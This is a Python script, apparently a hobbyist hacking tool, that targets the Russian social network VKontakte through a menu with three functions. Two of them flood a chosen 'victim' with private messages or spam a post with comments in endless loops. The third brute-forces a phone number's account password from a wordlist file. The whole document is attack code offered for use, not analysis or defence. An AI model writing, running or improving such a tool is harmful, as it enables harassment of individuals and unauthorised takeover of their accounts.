import vk_api, time, random, os

os.system("cls")

banner = """
\n____________________________________________________________________________
[1] - Спам в личные сообщения [2] - Спам комментариями под определенный пост
[3] - Подбор пароля(бета) [4] - Очистить
____________________________________________________________________________
"""

while True:
	print(banner)
	number = input("[Выберите 1,2,3,4]-> ")
	if number == "1":
		token_katemobile = input("Для спама в личные сообщения введите токен VK Admin: ") # Массив с токеном VK Admin
		usr_id = input("Цифровой(вечный) айди жертвы: ") # Massive
		msg_1 = input("Сообщение: ") # Massive
		while True:
			try:
				sessions = vk_api.VkApi(token = token_katemobile)
				vks = sessions.get_api()
				print("Сообщение - > ", msg_1, " -> ID: ",
				 vks.messages.send(user_id = usr_id, message = msg_1, random_id = random.randint(0, 9999999999)))
				time.sleep(3)
			except:
				print("Вы ввели неверный токен/айди или вк запросил капчу!")
				pass
	elif number == "2":
		token_vkadmin = input("Введите токен VK Admin: ") # Массив с токеном VK ADMIN
		own_id = input("Цифровой(вечный) айди вашей страницы: ") # Massive
		pst_id = input("Айди поста(в ссылке последние цифры после _): ") # Massive
		msg_2 = input("Комментарий: ")
		while True:
			try:
				session = vk_api.VkApi(token = token_vkadmin)
				vk = session.get_api()
				print(vk.wall.createComment(owner_id = own_id, post_id = pst_id,
				 message = msg_2, guid = random.randint(0, 9999999999)))
				time.sleep(3)
			except:
				print("Вы ввели неверный токен/айди или вк запросил капчу!")
				pass
	elif number == "4":
		os.system("cls")
		print(banner)
	elif number == "3":
		phone = input("Телефон: ")
		file = "base.txt" # Список с паролями(каждый пароль в отдельной строке)
		with open(file) as f:
			ines = f.readlines()
		lines = [line.strip('\n') for line in open(file)]
		for password in lines:
			try:
				vk_session = vk_api.VkApi(phone, str(password))
				vk_session.auth()
				print(phone, ":Пароль найден: " + str(password))
			except:
				print(str(password) + ' -> НЕ подошел или ВКонтакте запросил код в лс')
	else:
		print("Код не актуален, обновите его!")
	